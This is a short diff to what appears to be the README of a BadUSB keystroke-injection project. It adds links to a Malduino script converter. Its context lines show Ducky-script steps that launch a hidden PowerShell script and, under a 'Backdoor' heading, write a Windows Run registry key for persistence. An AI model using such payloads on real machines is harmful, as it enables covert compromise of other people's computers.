@@ -23,6 +23,7 @@ STRING powershell.exe -windowstyle hidden -file poc.ps1
 DELAY 500
 ENTER
 ```
+https://malduino.com/converter/ 
 
 ## Option 2 (Backdoor)
 
@@ -49,6 +50,8 @@ STRING reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /
 DELAY 500
 ENTER
 ```
+
+https://malduino.com/converter/
 
 ### Telegram Options
 
